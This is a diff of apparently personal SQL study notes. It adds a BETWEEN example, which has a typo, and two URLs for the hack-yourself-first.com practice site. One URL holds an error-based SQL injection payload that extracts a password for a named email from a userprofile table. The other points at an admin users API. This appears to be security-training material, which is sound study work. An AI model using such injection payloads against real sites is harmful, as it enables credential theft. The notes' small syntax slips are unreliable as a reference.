@@ -49,12 +49,15 @@ $ mysql -u root -p
 - LIKE operator: $ SELECT * FROM table_name WHERE col1 LIKE "regex"
 - OR: SELECT * FROM table_name WHERE col1 = "actualText1" AND col2 = "actualText2";
 - NOT: $ SELECT * FROM table_name WHERE NOT col1 LIKE "regex"
+- BETWEEN: $ SELECT * FROM table_name WHERE col1 BETWEEN factor ad factor
 - 
 
 
 
 
+https://hack-yourself-first.com/CarsByCylinders?Cylinders=V6' AND 1=(SELECT TOP 1 password FROM userprofile WHERE email='cyber1020@gmail.com');--
 
+https://hack-yourself-first.com/api/admin/users
 
 
 
